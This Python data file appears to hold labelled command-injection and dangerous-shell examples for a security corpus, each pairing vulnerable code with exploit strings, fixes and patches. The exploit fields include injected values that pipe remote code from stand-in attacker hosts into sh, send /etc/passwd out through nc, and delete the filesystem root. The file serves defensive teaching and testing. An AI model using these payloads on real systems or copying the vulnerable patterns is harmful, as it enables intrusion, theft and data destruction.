"""Dangerous-execution examples: command injection and dangerous shell commands."""
from corpus.builder import vuln

EXAMPLES = [
    vuln(
        id="cmdi-ossystem",
        lang="python", framework="flask", file="ping.py", line=2,
        code=(
            "def ping(host):\n"
            "    os.system('ping -c 1 ' + host)\n"
        ),
        category="COMMAND_INJECTION",
        description="Unsanitized host concatenated into an os.system shell command.",
        exploit="host='8.8.8.8; rm -rf /' or '$(curl attacker|sh)' runs arbitrary commands.",
        fix="Avoid the shell; pass an argument vector to subprocess with shell disabled.",
        patch="-    os.system('ping -c 1 ' + host)\n+    subprocess.run(['ping', '-c', '1', host], shell=False, check=True)",
    ),
    vuln(
        id="cmdi-node-exec",
        lang="javascript", framework="node", file="convert.js", line=2,
        code=(
            "function convert(file) {\n"
            "  exec(`convert ${file} out.png`, cb);\n"
            "}\n"
        ),
        category="COMMAND_INJECTION",
        description="Filename interpolated into a template literal passed to child_process.exec (a shell).",
        exploit="file='a.jpg; cat /etc/passwd | nc attacker 1234' executes through the shell.",
        fix="Use execFile with an argument array so no shell is invoked.",
        patch="-  exec(`convert ${file} out.png`, cb);\n+  execFile('convert', [file, 'out.png'], cb);",
    ),
    vuln(
        id="cmdi-subprocess-shell",
        lang="python", framework="none", file="backup.py", line=2,
        code=(
            "def backup(name):\n"
            "    subprocess.run(f'tar czf {name}.tgz /data', shell=True)\n"
        ),
        category="COMMAND_INJECTION",
        description="subprocess.run with shell=True and an interpolated name.",
        exploit="name='x; curl evil.sh | sh' executes attacker code with the service's privileges.",
        fix="Drop shell=True and pass an argument list.",
        patch="-    subprocess.run(f'tar czf {name}.tgz /data', shell=True)\n+    subprocess.run(['tar', 'czf', f'{name}.tgz', '/data'])",
    ),
    vuln(
        id="shell-curl-pipe-sh",
        lang="bash", framework="none", file="install.sh", line=1,
        code=(
            "curl -fsSL https://get.example.dev/install | sh\n"
        ),
        category="DANGEROUS_SHELL_COMMAND",
        description="Remote script piped directly into a shell with no verification.",
        exploit="A compromised or MITM'd endpoint executes arbitrary code on the host immediately.",
        fix="Download to a file, verify a pinned checksum/signature, review, then execute.",
        patch="-curl -fsSL https://get.example.dev/install | sh\n+curl -fsSL https://get.example.dev/install -o install.sh\n+echo \"<pinned-sha256>  install.sh\" | sha256sum -c -\n+sh ./install.sh",
        severity="HIGH",
    ),
    vuln(
        id="shell-rm-rf-var",
        lang="bash", framework="none", file="clean.sh", line=2,
        code=(
            "DIR=$1\n"
            "rm -rf \"$DIR\"/*\n"
        ),
        category="DANGEROUS_SHELL_COMMAND",
        description="Recursive delete on an unvalidated argument that may be empty or '/'.",
        exploit="Invoking with an empty or '/' argument expands to deleting the filesystem root.",
        fix="Validate the path is non-empty and within an expected base before deleting.",
        patch="-DIR=$1\n-rm -rf \"$DIR\"/*\n+DIR=$1\n+case \"$DIR\" in /work/*) ;; *) echo 'refusing'; exit 1;; esac\n+[ -n \"$DIR\" ] && rm -rf \"${DIR:?}\"/*",
        severity="HIGH",
    ),
    vuln(
        id="shell-eval-input",
        lang="python", framework="none", file="calc.py", line=2,
        code=(
            "def compute(expr):\n"
            "    return eval(expr)  # 'expr' comes from an HTTP request\n"
        ),
        category="DANGEROUS_SHELL_COMMAND",
        description="eval() on request-derived input is arbitrary code execution.",
        exploit="expr=\"__import__('os').system('id')\" runs arbitrary Python in-process.",
        fix="Parse with a safe expression evaluator (e.g. ast.literal_eval or a math parser), never eval.",
        patch="-    return eval(expr)\n+    import ast\n+    return ast.literal_eval(expr)",
        severity="HIGH",
        extra_findings=None,
    ),
]
